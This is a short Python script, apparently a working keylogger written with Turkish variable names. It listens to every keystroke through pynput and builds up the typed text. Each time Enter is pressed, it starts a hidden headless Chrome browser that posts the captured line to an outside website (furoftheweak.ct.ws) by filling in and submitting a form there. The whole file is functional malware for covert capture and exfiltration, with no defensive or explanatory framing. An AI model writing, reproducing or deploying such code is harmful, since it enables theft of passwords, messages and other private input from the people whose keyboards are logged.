  import threading
import pynput.keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By

kelime = ""
toplam = []


def websiteyegonder(mesaj):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    driver = webdriver.Chrome(options=options)
    url = "http://furoftheweak.ct.ws"
    driver.get(url)
    try:
        mesajkutusu = driver.find_element(By.XPATH, "//input[@id='messageInput']")
        mesajkutusu.send_keys(mesaj)
        gonderbutonu = driver.find_element(By.XPATH, "//button[contains(text(),'Kaydet')]")
        gonderbutonu.click()
    except Exception as e:
        print(f"Mesaj gönderme hatası: {e}")
    finally:
        driver.quit()


def yazdir(tus):
    global kelime
    try:
        if hasattr(tus, 'char') and tus.char:
            kelime += tus.char
        elif tus == pynput.keyboard.Key.space:
            kelime += " "
        elif tus == pynput.keyboard.Key.backspace:
            kelime = kelime[:-1] if kelime else kelime
        elif tus == pynput.keyboard.Key.enter:
            print(kelime)
            toplam.append(kelime)
            threading.Thread(target=websiteyegonder, args=(kelime,)).start()
            kelime = ""
        elif hasattr(tus, "vk"):
            kelime += f"<{tus.vk}>"
        else:
            print(f"Tanınmayan tuş: {tus}")
    except AttributeError:
        pass
with pynput.keyboard.Listener(on_press=yazdir) as dinle:
    dinle.join()
